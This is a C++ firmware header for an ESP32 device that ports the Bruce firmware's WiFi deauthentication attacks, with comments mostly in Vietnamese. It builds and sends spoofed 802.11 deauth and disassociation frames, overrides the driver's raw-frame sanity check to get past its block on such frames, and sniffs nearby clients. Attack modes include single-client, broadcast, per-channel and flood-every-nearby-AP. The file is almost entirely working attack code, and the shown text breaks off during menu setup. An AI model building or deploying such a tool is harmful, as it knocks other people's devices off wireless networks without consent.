#pragma once
/*
 * ============================================================
 *  BRUCE DEAUTHER - Full Port for C3-Phantom
 * ============================================================
 *  Nguon goc: Bruce Firmware (https://github.com/Redcxx/Bruce)
 *  File goc : src/modules/wifi/deauther.cpp / wifi_atks.cpp
 *
 *  Tinh nang tich hop:
 *    1. Deauth Station (Chon AP → Quet client → Deauth 1 client)
 *    2. Deauth All (Chon AP → Deauth tat ca client)
 *    3. Deauth Flood (Quet tat ca AP → Liet ke chon AP → Deauth flood)
 *    4. Deauth By Channel (Chon kenh → Deauth broadcast tren kenh do)
 *    5. Storm Mode (tu dong bung pha khi phat hien hieu qua)
 *    6. Multi-AP Mesh (ho tro tan cong AP co nhieu BSSID cung SSID)
 *    7. Multi-Band (2.4 GHz / 5 GHz / 6 GHz)
 *    8. Client Sniffer (thu dong phát hien client tren AP muc tieu)
 *    9. Vendor OUI Lookup (hien ten hang san xuat tu MAC)
 *   10. WiFi State Save/Restore (khoi phuc ket noi WiFi sau tan cong)
 *
 *  Tuong thich:
 *    - Display: SSD1306 128x64 OLED (thay cho TFT cua Bruce)
 *    - Buttons: LEFT / CENTER / RIGHT (thay cho Bruce's EscPress/SelPress)
 *    - WiFi TX: esp_wifi_80211_tx() (thay cho Bruce's wifiRawTx)
 *    - Menu: C3-Phantom Menu class
 * ============================================================
 */

#include "../global.hpp"
#include "../menu.hpp"
#include "../display_utils.h"
#include "utils.hpp"

#include <Arduino.h>
#include <WiFi.h>
#include <vector>
#include <string>
#include <utility>

extern "C" {
#include "esp_wifi.h"
#include "esp_wifi_types.h"
}

// ===========================================================
//  DISPLAY HELPERS (thay the TFT/Bruce display functions)
// ===========================================================

// In tieu de va dong trang thai len OLED
static void Bruce_ShowStatus(const char* title, const char* line1,
                              const char* line2 = nullptr,
                              const char* line3 = nullptr,
                              const char* line4 = nullptr)
{
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(WHITE);

    // Title voi gach chan
    display.setCursor(0, 0);
    display.print(title);
    display.drawLine(0, 9, 127, 9, WHITE);

    if (line1) { display.setCursor(0, 13); display.print(line1); }
    if (line2) { display.setCursor(0, 23); display.print(line2); }
    if (line3) { display.setCursor(0, 33); display.print(line3); }
    if (line4) { display.setCursor(0, 43); display.print(line4); }

    // "CTR=Dung" o cuoi
    display.setCursor(0, 56);
    display.print("CTR=Dung");
    display.display();
}

// Cap nhat dong dem frame (dong cuoi OLED)
static void Bruce_UpdateCounter(uint32_t total, bool storm = false)
{
    display.fillRect(0, 44, 128, 20, BLACK);
    display.setCursor(0, 44);
    display.print("So khung:");
    display.print(total);
    if (storm) { display.setCursor(80, 44); display.print("[BAO]"); }
    display.setCursor(0, 56);
    display.print("CTR=Dung");
    display.display();
}

// Hien menu chon 1 muc tu danh sach (LEFT/RIGHT = chon, CENTER = OK)
// Tra ve index duoc chon, -1 neu thoat
static int Bruce_SelectFromList(const char* title,
                                 const std::vector<String>& items)
{
    if (items.empty()) return -1;
    int idx = 0;
    int n   = (int)items.size();

    HaltTillRelease(BUTTON_LEFT);
    HaltTillRelease(BUTTON_CENTER);
    HaltTillRelease(BUTTON_RIGHT);
    delay(100);

    while (true) {
        display.clearDisplay();
        display.setTextSize(1);
        display.setTextColor(WHITE);

        display.setCursor(0, 0);
        display.print(title);
        display.drawLine(0, 9, 127, 9, WHITE);

        // Hien thi 3 dong, dong giua la muc dang chon
        for (int i = -1; i <= 1; i++) {
            int li = idx + i;
            if (li < 0 || li >= n) continue;
            int y = 20 + i * 14;
            if (i == 0) {
                display.fillRect(0, y - 2, 128, 12, WHITE);
                display.setTextColor(BLACK);
            } else {
                display.setTextColor(WHITE);
            }
            display.setCursor(2, y);
            // Giot bo ky tu neu qua dai
            String label = items[li];
            if (label.length() > 20) label = label.substring(0, 19) + "~";
            display.print(label);
            display.setTextColor(WHITE);
        }

        display.setCursor(0, 55);
        display.print("T/D=Chon CTR=OK");
        display.display();

        // Doi nut
        while (true) {
            if (ReadButton(BUTTON_LEFT)) {
                HaltTillRelease(BUTTON_LEFT);
                idx = (idx - 1 + n) % n;
                break;
            }
            if (ReadButton(BUTTON_RIGHT)) {
                HaltTillRelease(BUTTON_RIGHT);
                idx = (idx + 1) % n;
                break;
            }
            if (ReadButton(BUTTON_CENTER)) {
                HaltTillRelease(BUTTON_CENTER);
                // Muc cuoi = [Back]
                if (idx == n - 1) return -1;
                return idx;
            }
            delay(30);
        }
    }
}

// ===========================================================
//  MAC UTILITIES
// ===========================================================

static String Bruce_MACtoString(const uint8_t* mac)
{
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

static bool Bruce_StringToMAC(const char* str, uint8_t* mac)
{
    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &mac[0], &mac[1], &mac[2],
                  &mac[3], &mac[4], &mac[5]) == 6;
}

static bool Bruce_IsMACZero(const uint8_t* mac)
{
    for (int i = 0; i < 6; i++) if (mac[i]) return false;
    return true;
}

static bool Bruce_MACEqual(const uint8_t* a, const uint8_t* b)
{
    return memcmp(a, b, 6) == 0;
}

// ===========================================================
//  VENDOR OUI LOOKUP
// ===========================================================

static String Bruce_VendorFromMAC(const uint8_t* mac)
{
    char prefix[9];
    snprintf(prefix, sizeof(prefix), "%02X:%02X:%02X",
             mac[0], mac[1], mac[2]);

    static const struct { const char* oui; const char* name; } oui_list[] = {
        {"00:1A:2B","Apple"},   {"00:1E:52","Apple"},   {"00:25:00","Apple"},
        {"00:11:22","Samsung"}, {"00:23:E7","Samsung"},  {"00:24:FE","Samsung"},
        {"00:0C:29","VMware"},  {"00:50:56","VMware"},
        {"00:1C:42","Cisco"},   {"00:1A:A0","Cisco"},
        {"00:0F:FE","TP-Link"}, {"00:18:4D","Netgear"},
        {"00:1F:33","Asus"},    {"00:1A:11","Google"},
        {"00:0F:52","Intel"},   {"00:04:23","Intel"},
        {"00:0E:58","HP"},      {"00:1F:3A","Dell"},
        {"00:1A:80","Sony"},    {"00:1B:FC","Nintendo"},
        {"00:1E:5E","Amazon"},  {"00:18:F8","D-Link"},
        {"00:1E:8C","Linksys"},
    };
    for (auto& e : oui_list)
        if (strcmp(prefix, e.oui) == 0) return String(e.name);
    return "Unknown";
}

// ===========================================================
//  WIFI STATE SAVE / RESTORE
// ===========================================================

struct BruceWiFiState {
    bool     was_connected = false;
    String   ssid;
    uint8_t  channel       = 0;
    wifi_mode_t mode       = WIFI_MODE_NULL;
};

static BruceWiFiState Bruce_SaveWiFiState()
{
    BruceWiFiState st;
    st.was_connected = WiFi.isConnected();
    if (st.was_connected) {
        st.ssid    = WiFi.SSID();
        st.channel = (uint8_t)WiFi.channel();
    }
    st.mode = WiFi.getMode();
    return st;
}

static void Bruce_RestoreWiFiState(const BruceWiFiState& st)
{
    WiFi.mode(st.mode);
    delay(50);
    if (st.was_connected && st.ssid.length() > 0) {
        // Chi ket noi lai neu co SSID (khong luu password o day)
        // Nguoi dung can ket noi lai thu cong neu can
        Serial.printf("[Bruce-Deauth] Previous SSID: %s (reconnect manually)\n",
                      st.ssid.c_str());
    }
}

// ===========================================================
//  WIFI INIT FOR DEAUTH (AP mode, channel set)
// ===========================================================

static bool Bruce_InitDeauthMode(uint8_t channel)
{
    WiFi.disconnect(true);
    delay(50);
    WiFi.mode(WIFI_AP);
    delay(100);

    bool ok = WiFi.softAP("C3-Phantom", "", channel, 0, 1, false);
    if (!ok) {
        // Thu lai voi mode STA
        WiFi.mode(WIFI_STA);
        delay(100);
        ok = (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) == ESP_OK);
    }
    delay(50);
    return ok;
}

// ===========================================================
//  RAW FRAME SEND (bypass sanity check)
// ===========================================================

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    if (arg == 31337) return 1;
    return 0;
}

static void Bruce_SendRawFrame(const uint8_t* buf, int len)
{
    // Thu gui qua AP interface truoc, fallback STA
    if (esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false) != ESP_OK)
        esp_wifi_80211_tx(WIFI_IF_STA, buf, len, false);
}

// ===========================================================
//  DEAUTH FRAME BUILDER  (Bruce: buildOptimizedDeauthFrame)
// ===========================================================

// reason_codes 2.4 GHz
static const uint8_t DEAUTH_REASONS[]     = {0x01,0x04,0x06,0x07,0x08,0x0A,0x0D,0x0F,0x12,0x28};
// reason_codes 5/6 GHz
static const uint8_t DEAUTH_REASONS_5G[]  = {0x30,0x31,0x32,0x33,0x34,0x07,0x08,0x0A,0x0D,0x0F};
static const int REASONS_COUNT    = sizeof(DEAUTH_REASONS);
static const int REASONS_5G_COUNT = sizeof(DEAUTH_REASONS_5G);

static int Bruce_GetBand(uint8_t ch)
{
    if (ch >= 1  && ch <= 14)  return 0; // 2.4 GHz
    if (ch >= 36 && ch <= 165) return 1; // 5 GHz
    return 2; // 6 GHz
}

static void Bruce_BuildFrame(uint8_t* frame,
                              const uint8_t* dest, const uint8_t* src, const uint8_t* bssid,
                              uint8_t reason, bool is_disassoc)
{
    frame[0] = is_disassoc ? 0xA0 : 0xC0;
    frame[1] = 0x00;
    frame[2] = 0x00;
    frame[3] = 0x00;
    memcpy(frame + 4,  dest,  6);
    memcpy(frame + 10, src,   6);
    memcpy(frame + 16, bssid, 6);
    uint16_t seq = (uint16_t)random(0, 4096);
    frame[22] = (seq >> 4) & 0xFF;
    frame[23] = (seq & 0x0F) << 4;
    frame[24] = reason;
    frame[25] = 0x00;
}

// Gui 1 frame 3 lan (Bruce: sendDeauthFrames)
static void Bruce_SendFrameTriple(const uint8_t* frame)
{
    Bruce_SendRawFrame(frame, 26);
    delayMicroseconds(500);
    Bruce_SendRawFrame(frame, 26);
    delayMicroseconds(500);
    Bruce_SendRawFrame(frame, 26);
}

// Gui du 4 chieu: AP→STA + STA→AP (deauth + disassoc)
static uint32_t Bruce_SendDeauthQuad(const uint8_t* ap, const uint8_t* target, uint8_t band)
{
    const uint8_t* reasons = (band == 0) ? DEAUTH_REASONS : DEAUTH_REASONS_5G;
    int           count    = (band == 0) ? REASONS_COUNT  : REASONS_5G_COUNT;
    uint8_t reason = reasons[random(count)];

    uint8_t f[4][26];
    Bruce_BuildFrame(f[0], target, ap, ap, reason, false); // AP→STA deauth
    Bruce_BuildFrame(f[1], target, ap, ap, reason, true);  // AP→STA disassoc
    Bruce_BuildFrame(f[2], ap, target, ap, reason, false); // STA→AP deauth
    Bruce_BuildFrame(f[3], ap, target, ap, reason, true);  // STA→AP disassoc

    for (int i = 0; i < 4; i++) Bruce_SendFrameTriple(f[i]);
    return 12; // 4 loai × 3 lan gui
}

// ===========================================================
//  AP CHANNEL DETECTION (cache 5 giay)
// ===========================================================

static int Bruce_GetAPChannel(const uint8_t* bssid)
{
    static unsigned long cache_ts  = 0;
    static uint8_t       cache_mac[6] = {0};
    static int           cache_ch  = 0;

    if (millis() - cache_ts < 5000 && Bruce_MACEqual(cache_mac, bssid))
        return cache_ch;

    int ch = 0;
    int n  = WiFi.scanNetworks(false, false);
    for (int i = 0; i < n; i++) {
        if (Bruce_MACEqual(WiFi.BSSID((uint8_t)i), bssid)) {
            ch = WiFi.channel((uint8_t)i);
            break;
        }
    }
    WiFi.scanDelete();
    if (ch == 0) { ch = WiFi.channel(); if (ch == 0) ch = 1; }

    memcpy(cache_mac, bssid, 6);
    cache_ch  = ch;
    cache_ts  = millis();
    return ch;
}

// ===========================================================
//  MULTI-AP (Mesh): Cac AP cung SSID tren nhieu bang tan
// ===========================================================

struct BruceAPInfo {
    uint8_t bssid[6];
    uint8_t channel;
    int     band;
};

static std::vector<BruceAPInfo> g_mesh_aps;

static void Bruce_CacheMeshAPs(const char* target_ssid)
{
    g_mesh_aps.clear();
    if (!target_ssid || strlen(target_ssid) == 0) return;

    int n = WiFi.scanNetworks(false, false);
    for (int i = 0; i < n; i++) {
        if (WiFi.SSID(i) == String(target_ssid)) {
            BruceAPInfo ap;
            memcpy(ap.bssid, WiFi.BSSID((uint8_t)i), 6);
            ap.channel = (uint8_t)WiFi.channel((uint8_t)i);
            ap.band    = Bruce_GetBand(ap.channel);
            g_mesh_aps.push_back(ap);
        }
    }
    WiFi.scanDelete();
}

// ===========================================================
//  CLIENT SNIFFER  (Bruce: clientSnifferCallback)
// ===========================================================

struct BruceClient {
    uint8_t mac[6];
    int8_t  rssi;
    String  vendor;
};

static std::vector<BruceClient> g_detected_clients;
static uint8_t                  g_sniffer_target_bssid[6];
static volatile bool            g_sniffer_active = false;

typedef struct {
    uint16_t frame_ctrl;
    uint16_t duration;
    uint8_t  addr1[6];
    uint8_t  addr2[6];
    uint8_t  addr3[6];
    uint16_t seq_ctrl;
} __attribute__((packed)) BruceWiFiHdr;

static void Bruce_ClientSnifferCB(void* buf, wifi_promiscuous_pkt_type_t type)
{
    if (!g_sniffer_active || type != WIFI_PKT_DATA) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    if (pkt->rx_ctrl.sig_len < (int)sizeof(BruceWiFiHdr)) return;

    BruceWiFiHdr* hdr = (BruceWiFiHdr*)pkt->payload;

    // Kiem tra xem dia chi 1 hoac 3 co phai BSSID muc tieu khong
    if (!Bruce_MACEqual(hdr->addr1, g_sniffer_target_bssid) &&
        !Bruce_MACEqual(hdr->addr3, g_sniffer_target_bssid)) return;

    uint8_t* client = hdr->addr2;

    // Bo qua broadcast/multicast
    if (client[0] & 0x01) return;

    // Kiem tra neu da ton tai
    for (auto& c : g_detected_clients)
        if (Bruce_MACEqual(c.mac, client)) return;

    BruceClient bc;
    memcpy(bc.mac, client, 6);
    bc.rssi   = pkt->rx_ctrl.rssi;
    bc.vendor = Bruce_VendorFromMAC(client);
    g_detected_clients.push_back(bc);
}

static void Bruce_StartSniffer(const uint8_t* bssid)
{
    memcpy(g_sniffer_target_bssid, bssid, 6);
    g_detected_clients.clear();
    g_sniffer_active = true;

    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL };
    esp_wifi_set_promiscuous_rx_cb(Bruce_ClientSnifferCB);
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous(true);
}

static void Bruce_StopSniffer()
{
    g_sniffer_active = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
}

// ===========================================================
//  CORE ATTACK: DEAUTH LOOP chung
//   - ap_bssid:  MAC cua AP (nguon gia mao)
//   - target:    MAC cua client (broadcast = tat ca)
//   - channel:   kenh WiFi
//   - title:     Ten hien thi tren OLED
// ===========================================================

static void Bruce_RunDeauthLoop(const uint8_t* ap_bssid, const uint8_t* target,
                                 uint8_t channel, const char* title,
                                 const std::vector<BruceAPInfo>* mesh = nullptr)
{
    int  band     = Bruce_GetBand(channel);
    bool use_mesh = (mesh && mesh->size() > 1);

    if (!Bruce_InitDeauthMode(channel)) {
        display.clearDisplay();
        Display_PrintCentered("Khoi tao that bai!");
        display.display();
        delay(1500);
        return;
    }

    static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    bool target_is_broadcast = Bruce_MACEqual(target, BROADCAST);

    // Xay dung frame broadcast ban dau (se duoc cap nhat trong vong lap)
    uint8_t bcast_frame[26];
    Bruce_BuildFrame(bcast_frame, BROADCAST, ap_bssid, ap_bssid, 0x07, false);

    char l1[28], l2[28], l3[28];
    snprintf(l1, sizeof(l1), "AP:%s", Bruce_MACtoString(ap_bssid).substring(9).c_str());
    snprintf(l2, sizeof(l2), "CH:%d %s", channel,
             band == 1 ? "(5GHz)" : band == 2 ? "(6GHz)" : "(2.4G)");
    snprintf(l3, sizeof(l3), "Mesh:%s", use_mesh ? "YES" : "NO");

    Bruce_ShowStatus(title, l1, l2, l3);
    delay(500);

    HaltTillRelease(BUTTON_CENTER);

    uint32_t total_frames = 0;
    uint32_t last_update  = millis();
    bool     storm_active = false;
    uint32_t burst_ctr    = 0;
    size_t   ap_idx       = 0;
    int      reason_idx   = 0;

    const uint8_t* reasons = (band == 0) ? DEAUTH_REASONS : DEAUTH_REASONS_5G;
    int            rcnt    = (band == 0) ? REASONS_COUNT  : REASONS_5G_COUNT;

    while (!ReadButton(BUTTON_CENTER)) {

        reason_idx = (reason_idx + 1) % rcnt;
        uint8_t reason = reasons[reason_idx];

        if (use_mesh) {
            // Xoay vong qua cac AP trong mesh
            ap_idx = (ap_idx + 1) % mesh->size();
            const BruceAPInfo& cur = (*mesh)[ap_idx];
            esp_wifi_set_channel(cur.channel, WIFI_SECOND_CHAN_NONE);
            delayMicroseconds(300);
            total_frames += Bruce_SendDeauthQuad(cur.bssid, target,
                                                  Bruce_GetBand(cur.channel));
        } else {
            if (target_is_broadcast) {
                // Broadcast deauth (deauth all)
                uint8_t f[26];
                Bruce_BuildFrame(f, BROADCAST, ap_bssid, ap_bssid, reason, false);
                Bruce_SendFrameTriple(f);
                Bruce_BuildFrame(f, BROADCAST, ap_bssid, ap_bssid, reason, true);
                Bruce_SendFrameTriple(f);
                total_frames += 6;
            } else {
                total_frames += Bruce_SendDeauthQuad(ap_bssid, target, band);
            }
        }
        burst_ctr++;

        // Kich hoat Storm mode sau 50 burst
        if (!storm_active && burst_ctr > 50 && random(100) < 25) storm_active = true;

        if (storm_active) {
            // Gui them burst lien tuc
            for (int b = 0; b < 8; b++) {
                uint8_t f[26];
                const uint8_t* src = use_mesh && !mesh->empty()
                                     ? (*mesh)[ap_idx % mesh->size()].bssid
                                     : ap_bssid;
                Bruce_BuildFrame(f, target, src, src, reasons[random(rcnt)], false);
                Bruce_SendFrameTriple(f);
                total_frames += 3;
            }
            if (random(100) < 15) storm_active = false;
            delayMicroseconds(800);
        } else {
            delay(random(2, 8));
        }

        // Cap nhat OLED moi 1 giay
        if (millis() - last_update > 1000) {
            Bruce_UpdateCounter(total_frames, storm_active);
            last_update = millis();
        }
    }

    HaltTillRelease(BUTTON_CENTER);

    // Hien ket qua cuoi
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(0, 0);
    display.print("Da Dung Tan Cong");
    display.drawLine(0, 9, 127, 9, WHITE);
    char res[32];
    snprintf(res, sizeof(res), "So khung: %lu", (unsigned long)total_frames);
    display.setCursor(0, 15);
    display.print(res);
    if (storm_active) { display.setCursor(0, 27); display.print("Che do bao da bat"); }
    display.display();
    delay(2000);
}

// ===========================================================
//  1. DEAUTH ALL  →  Broadcast deauth tren 1 AP
// ===========================================================

void Bruce_DeauthAll(const uint8_t* ap_bssid, uint8_t channel, const char* ssid = "")
{
    BruceWiFiState saved = Bruce_SaveWiFiState();

    // Quet mesh (cac AP cung SSID)
    if (ssid && strlen(ssid) > 0)
        Bruce_CacheMeshAPs(ssid);
    else
        g_mesh_aps.clear();

    static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    Bruce_RunDeauthLoop(ap_bssid, BROADCAST, channel, "Ngat Tat Ca",
                        g_mesh_aps.size() > 1 ? &g_mesh_aps : nullptr);

    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
    Bruce_RestoreWiFiState(saved);
}

// ===========================================================
//  2. DEAUTH STATION  →  Deauth 1 client cu the
// ===========================================================

void Bruce_DeauthStation(const uint8_t* ap_bssid, const uint8_t* client_mac,
                          uint8_t channel)
{
    BruceWiFiState saved = Bruce_SaveWiFiState();
    Bruce_RunDeauthLoop(ap_bssid, client_mac, channel, "Ngat Thiet Bi");
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
    Bruce_RestoreWiFiState(saved);
}

// ===========================================================
//  3. SCAN CLIENTS ON AP  (sniffer 8 giay)
// ===========================================================

void Bruce_ScanAndDeauthStation(const uint8_t* ap_bssid, uint8_t channel)
{
    BruceWiFiState saved = Bruce_SaveWiFiState();

    // Khoi tao promiscuous tren kenh AP
    WiFi.disconnect(true);
    WiFi.mode(WIFI_STA);
    delay(100);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    Bruce_StartSniffer(ap_bssid);

    // Gui deauth broadcast de "dua" client ve de bat
    uint8_t probe[26];
    static const uint8_t BC[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    Bruce_BuildFrame(probe, BC, ap_bssid, ap_bssid, 0x07, false);

    uint32_t scan_start = millis();
    int      tick       = 0;

    while (millis() - scan_start < 8000) {
        if (ReadButton(BUTTON_CENTER)) break;

        if (millis() - scan_start > (uint32_t)(tick * 1000)) {
            // Gui probe moi giay
            Bruce_SendRawFrame(probe, 26);
            tick++;

            char l2[28], l3[28];
            snprintf(l2, sizeof(l2), "Thoi gian: %ds", tick);
            snprintf(l3, sizeof(l3), "Thiet bi: %u", (unsigned)g_detected_clients.size());
            Bruce_ShowStatus("Quet Thiet Bi", l2, l3, "CTR=Dung");
        }
        delay(100);
    }

    Bruce_StopSniffer();
    HaltTillRelease(BUTTON_CENTER);

    // --- Hien danh sach client de chon ---
    if (g_detected_clients.empty()) {
        display.clearDisplay();
        Display_PrintCentered("No clients\nfound!");
        display.display();
        delay(2000);
        Bruce_RestoreWiFiState(saved);
        return;
    }

    // Xay dung danh sach hien thi
    std::vector<String> labels;
    for (auto& c : g_detected_clients) {
        char buf[32];
        snprintf(buf, sizeof(buf), "%s %ddBm",
                 c.vendor.c_str(), c.rssi);
        labels.push_back(String(buf));
    }
    labels.push_back("[Ngat tat ca]");
    labels.push_back("[Quay lai]");

    int sel = Bruce_SelectFromList("Chon Thiet Bi", labels);

    if (sel >= 0 && sel < (int)g_detected_clients.size()) {
        // Deauth 1 client cu the
        Bruce_DeauthStation(ap_bssid, g_detected_clients[sel].mac, channel);
    } else if (sel == (int)g_detected_clients.size()) {
        // Deauth ALL
        Bruce_DeauthAll(ap_bssid, channel);
    }

    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
    Bruce_RestoreWiFiState(saved);
}

// ===========================================================
//  4. DEAUTH FROM SCAN  →  Quet AP → Chon AP → Submenu
// ===========================================================

void Bruce_DeauthFromScan()
{
    display.clearDisplay();
    Display_PrintCentered("Scanning\nWiFi...");
    display.display();

    WiFi_Init();
    int n = WiFi.scanNetworks(false, true);

    if (n == 0) {
        display.clearDisplay();
        Display_PrintCentered("Khong tim thay AP!");
        display.display();
        delay(2000);
        return;
    }

    // Xay dung danh sach AP
    std::vector<String>  labels;
    std::vector<uint8_t> channels;
    std::vector<String>  ssids;

    struct APEntry { uint8_t bssid[6]; uint8_t ch; String ssid; int rssi; };
    std::vector<APEntry> entries;

    for (int i = 0; i < n; i++) {
        APEntry e;
        memcpy(e.bssid, WiFi.BSSID((uint8_t)i), 6);
        e.ch   = (uint8_t)WiFi.channel((uint8_t)i);
        e.ssid = (WiFi.SSID(i).length() > 0) ? WiFi.SSID(i) : "<Hidden>";
        e.rssi = WiFi.RSSI(i);

        char buf[32];
        snprintf(buf, sizeof(buf), "%s (%ddB)", e.ssid.c_str(), e.rssi);
        labels.push_back(String(buf));
        entries.push_back(e);
    }
    labels.push_back("[Quay lai]");
    WiFi.scanDelete();

    int ap_sel = Bruce_SelectFromList("Chon Mang WiFi", labels);
    if (ap_sel < 0 || ap_sel >= (int)entries.size()) return;

    APEntry& chosen = entries[ap_sel];

    // Submenu hanh dong
    std::vector<String> actions = {
        "Ngat tat ca client",
        "Quet va chon client",
        "[Quay lai]"
    };
    int act = Bruce_SelectFromList(chosen.ssid.c_str(), actions);

    if (act == 0) {
        Bruce_DeauthAll(chosen.bssid, chosen.ch, chosen.ssid.c_str());
    } else if (act == 1) {
        Bruce_ScanAndDeauthStation(chosen.bssid, chosen.ch);
    }
}

// ===========================================================
//  5. DEAUTH BY CHANNEL  →  Chon kenh, broadcast deauth
// ===========================================================

void Bruce_DeauthByChannel()
{
    // Chon kenh 1-13
    std::vector<String> ch_list;
    for (int c = 1; c <= 13; c++) {
        char buf[16];
        snprintf(buf, sizeof(buf), "Kenh %d", c);
        ch_list.push_back(String(buf));
    }
    ch_list.push_back("[Quay lai]");

    int sel = Bruce_SelectFromList("Chon Kenh WiFi", ch_list);
    if (sel < 0 || sel >= 13) return;

    uint8_t channel = (uint8_t)(sel + 1);

    // Dung broadcast MAC lam AP gia
    static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    BruceWiFiState saved = Bruce_SaveWiFiState();
    Bruce_RunDeauthLoop(BROADCAST, BROADCAST, channel, "Ngat Theo Kenh");
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
    Bruce_RestoreWiFiState(saved);
}

// ===========================================================
//  6. DEAUTH FLOOD  →  Quet tat ca AP → Tan cong tuan tu
//     (Port tu Bruce's deauthFloodAttack)
// ===========================================================

void Bruce_DeauthFlood()
{
    display.clearDisplay();
    Display_PrintCentered("Scanning\nAll APs...");
    display.display();

    WiFi_Init();

    // Quet tat ca AP (ke ca an)
    int n = WiFi.scanNetworks(false, true);
    if (n == 0) {
        display.clearDisplay();
        Display_PrintCentered("Khong tim thay AP!");
        display.display();
        delay(2000);
        return;
    }

    struct FloodAP { uint8_t bssid[6]; uint8_t channel; };
    std::vector<FloodAP> flood_aps;
    flood_aps.reserve(n);

    for (int i = 0; i < n; i++) {
        FloodAP fa;
        memcpy(fa.bssid, WiFi.BSSID((uint8_t)i), 6);
        fa.channel = (uint8_t)WiFi.channel((uint8_t)i);
        flood_aps.push_back(fa);
    }
    WiFi.scanDelete();

    char l2[28];
    snprintf(l2, sizeof(l2), "Tim duoc %u mang", (unsigned)flood_aps.size());
    Bruce_ShowStatus("Tan Cong Tran Ngap", l2, "Tat ca cac kenh", "CTR=Dung");
    delay(500);
    HaltTillRelease(BUTTON_CENTER);

    BruceWiFiState saved = Bruce_SaveWiFiState();

    // Khoi dong AP mode tren kenh 1
    Bruce_InitDeauthMode(1);

    static const uint8_t BC[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint32_t total  = 0;
    uint32_t last_u = millis();
    size_t   idx    = 0;

    while (!ReadButton(BUTTON_CENTER)) {
        FloodAP& fa = flood_aps[idx];

        // Set kenh cho AP hien tai
        esp_wifi_set_channel(fa.channel, WIFI_SECOND_CHAN_NONE);
        delay(1);

        // Gui deauth broadcast
        int band = Bruce_GetBand(fa.channel);
        const uint8_t* reas = (band == 0) ? DEAUTH_REASONS : DEAUTH_REASONS_5G;
        int            rcnt = (band == 0) ? REASONS_COUNT  : REASONS_5G_COUNT;

        for (int burst = 0; burst < 5; burst++) {
            uint8_t f[26];
            Bruce_BuildFrame(f, BC, fa.bssid, fa.bssid, reas[random(rcnt)], false);
            Bruce_SendFrameTriple(f);
            Bruce_BuildFrame(f, BC, fa.bssid, fa.bssid, reas[random(rcnt)], true);
            Bruce_SendFrameTriple(f);
            total += 6;
        }

        idx = (idx + 1) % flood_aps.size();
        delay(random(2, 6));

        if (millis() - last_u > 1000) {
            char l1[28], l2[28];
            snprintf(l1, sizeof(l1), "CH:%d AP:%u", fa.channel, (unsigned)(idx+1));
            snprintf(l2, sizeof(l2), "Frames:%lu", (unsigned long)total);
            Bruce_ShowStatus("Tan Cong Tran Ngap", l1, l2, "CTR=Dung");
            last_u = millis();
        }
    }

    HaltTillRelease(BUTTON_CENTER);

    display.clearDisplay();
    char res[32];
    snprintf(res, sizeof(res), "Done!\nFrames: %lu", (unsigned long)total);
    Display_PrintCentered(res);
    display.display();
    delay(2000);

    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
    Bruce_RestoreWiFiState(saved);
}

// ===========================================================
//  7. TARGET DEAUTH  →  Quet AP → Nhap MAC client → Deauth
// ===========================================================

void Bruce_TargetDeauth()
{
    display.clearDisplay();
    Display_PrintCentered("Scanning\nWiFi...");
    display.display();

    WiFi_Init();
    int n = WiFi.scanNetworks(false, true);

    if (n == 0) {
        display.clearDisplay();
        Display_PrintCentered("Khong tim thay AP!");
        display.display();
        delay(2000);
        return;
    }

    struct APE { uint8_t bssid[6]; uint8_t ch; String ssid; };
    std::vector<APE>    entries;
    std::vector<String> labels;

    for (int i = 0; i < n; i++) {
        APE e;
        memcpy(e.bssid, WiFi.BSSID((uint8_t)i), 6);
        e.ch   = (uint8_t)WiFi.channel((uint8_t)i);
        e.ssid = (WiFi.SSID(i).length() > 0) ? WiFi.SSID(i) : "<Hidden>";

        char buf[32];
        snprintf(buf, sizeof(buf), "%s ch%d", e.ssid.c_str(), e.ch);
        labels.push_back(String(buf));
        entries.push_back(e);
    }
    labels.push_back("[Quay lai]");
    WiFi.scanDelete();

    int sel = Bruce_SelectFromList("Chon AP Muc Tieu", labels);
    if (sel < 0 || sel >= (int)entries.size()) return;

    APE& ap = entries[sel];

    // Submenu
    std::vector<String> sub = {
        "Deauth ALL (broadcast)",
        "Scan for clients",
        "[Quay lai]"
    };
    int act = Bruce_SelectFromList(ap.ssid.c_str(), sub);

    if (act == 0) {
        Bruce_DeauthAll(ap.bssid, ap.ch, ap.ssid.c_str());
    } else if (act == 1) {
        Bruce_ScanAndDeauthStation(ap.bssid, ap.ch);
    }
}

// ===========================================================
//  MAIN ENTRY: Tao Menu con WiFi Deauth (Bruce) cho scan.hpp
// ===========================================================

void WiFi_BruceDeauthMenu()
{
    Menu* menu = new Menu();

    menu->AddItem(MenuItem("Deauth from Scan",  []() { Bruce_DeauthFromScan();  }));
    menu->AddItem(MenuItem("Target Deauth",      []() { Bruce_TargetDeauth();    }));
    menu->AddItem(MenuItem("Deauth Flood (All)", []() { Bruce_DeauthFlood();     }));
